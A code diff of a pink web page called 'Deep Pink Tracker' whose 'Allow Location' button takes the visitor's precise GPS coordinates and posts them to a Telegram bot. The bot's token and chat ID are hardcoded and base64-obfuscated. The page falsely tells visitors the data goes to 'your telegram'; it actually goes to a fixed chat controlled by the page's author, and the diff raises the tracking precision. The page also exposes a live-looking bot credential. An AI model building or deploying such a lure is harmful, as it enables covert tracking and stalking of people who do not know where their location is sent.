@@ -2,51 +2,51 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Deep Pink</title>
+<title>Deep Pink Tracker</title>
 
 <style>
-    body {
-        margin: 0;
-        height: 100vh;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        background-color: #FF1493;
-        font-family: Arial, sans-serif;
-        color: white;
-        text-align: center;
-    }
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  background:#FF1493;
+  font-family:Arial, sans-serif;
+  color:#fff;
+  text-align:center;
+}
 
-    button {
-        padding: 12px 20px;
-        font-size: 16px;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-    }
+button{
+  padding:12px 20px;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:16px;
+}
 
-    #progressContainer {
-        width: 80%;
-        height: 20px;
-        background: rgba(255,255,255,0.3);
-        border-radius: 10px;
-        margin-top: 20px;
-        overflow: hidden;
-        display: none;
-    }
+#progressContainer{
+  width:80%;
+  height:20px;
+  background:rgba(255,255,255,0.3);
+  border-radius:10px;
+  margin-top:20px;
+  overflow:hidden;
+  display:none;
+}
 
-    #progressBar {
-        height: 100%;
-        width: 0%;
-        background: white;
-        transition: width 0.3s;
-    }
+#progressBar{
+  height:100%;
+  width:0%;
+  background:#fff;
+  transition:width .3s;
+}
 
-    #statusText {
-        margin-top: 15px;
-        font-size: 18px;
-    }
+#statusText{
+  margin-top:15px;
+  font-size:18px;
+}
 </style>
 </head>
 
@@ -55,98 +55,115 @@
 <button onclick="getLocation()">Allow Location</button>
 
 <div id="progressContainer">
-    <div id="progressBar"></div>
+  <div id="progressBar"></div>
 </div>
 
 <div id="statusText"></div>
 
 <script>
-(function () {
+(function(){
 
-    const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
-    const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
+const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
+const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
 
-    function updateProgress(percent) {
-        document.getElementById("progressBar").style.width = percent + "%";
-    }
+function updateProgress(p){
+  document.getElementById("progressBar").style.width = p + "%";
+}
 
-    function setStatus(text) {
-        document.getElementById("statusText").innerText = text;
-    }
+function setStatus(t){
+  document.getElementById("statusText").innerText = t;
+}
 
-    function sendToTelegram(lat, lon, country) {
-        const message =
+function sendToTelegram(lat, lon, country){
+  const msg =
 `📍 Location Detected
 
-Latitude: ${lat}
 Longitude: ${lon}
+Latitude: ${lat}
 Country: ${country}
 
-Map: https://www.google.com/maps?q=${lat},${lon}`;
+https://www.google.com/maps?q=${lat},${lon}`;
 
-        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        });
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:msg
+    })
+  });
+}
+
+async function getCountry(lat, lon){
+  try{
+    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+    const data = await res.json();
+    return data.address.country || "Unknown";
+  }catch{
+    return "Unknown";
+  }
+}
+
+// ✅ SAME FUNCTION STYLE (HIGH ACCURACY) FROM YOUR SECOND CODE
+window.getLocation = function(){
+
+  if(!navigator.geolocation){
+    setStatus("Geolocation not supported");
+    return;
+  }
+
+  document.getElementById("progressContainer").style.display="block";
+  setStatus("Checking where are you from...");
+
+  let progress = 0;
+
+  const interval = setInterval(()=>{
+    if(progress < 90){
+      progress += 10;
+      updateProgress(progress);
     }
+  },300);
 
-    async function getCountry(lat, lon) {
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-            const data = await res.json();
-            return data.address.country || "Unknown";
-        } catch {
-            return "Unknown";
-        }
+  navigator.geolocation.getCurrentPosition(
+
+    async (pos)=>{
+
+      // 🔥 EXACT SAME PRECISION LOGIC
+      const latitude  = pos.coords.latitude.toFixed(6);
+      const longitude = pos.coords.longitude.toFixed(6);
+
+      progress = 95;
+      updateProgress(progress);
+
+      const country = await getCountry(latitude, longitude);
+
+      progress = 100;
+      updateProgress(100);
+      clearInterval(interval);
+
+      setStatus(`You are from ${country}`);
+
+      try{
+        await sendToTelegram(latitude, longitude, country);
+        setStatus("Your latitude and longitude are sent to your telegram");
+      }catch{
+        setStatus("Failed to send data to Telegram");
+      }
+
+    },
+
+    (err)=>{
+      clearInterval(interval);
+      setStatus("Permission denied or unavailable");
+    },
+
+    {
+      enableHighAccuracy:true,   // ✅ SAME AS YOUR PROVIDED CODE
+      timeout:10000,
+      maximumAge:0
     }
-
-    window.getLocation = function () {
-
-        document.getElementById("progressContainer").style.display = "block";
-        setStatus("Checking where are you from...");
-
-        let progress = 0;
-
-        const interval = setInterval(() => {
-            if (progress < 90) {
-                progress += 10;
-                updateProgress(progress);
-            }
-        }, 300);
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-
-            progress = 95;
-            updateProgress(progress);
-
-            const country = await getCountry(lat, lon);
-
-            progress = 100;
-            updateProgress(100);
-
-            clearInterval(interval);
-
-            setStatus(`You are from ${country}`);
-
-            try {
-                await sendToTelegram(lat, lon, country);
-                setStatus("Your latitude and longitude are sent to your telegram");
-            } catch {
-                setStatus("Failed to send data to Telegram");
-            }
-
-        }, (err) => {
-            clearInterval(interval);
-            setStatus("Location access denied or failed");
-        });
-    };
+  );
+};
 
 })();
 </script>
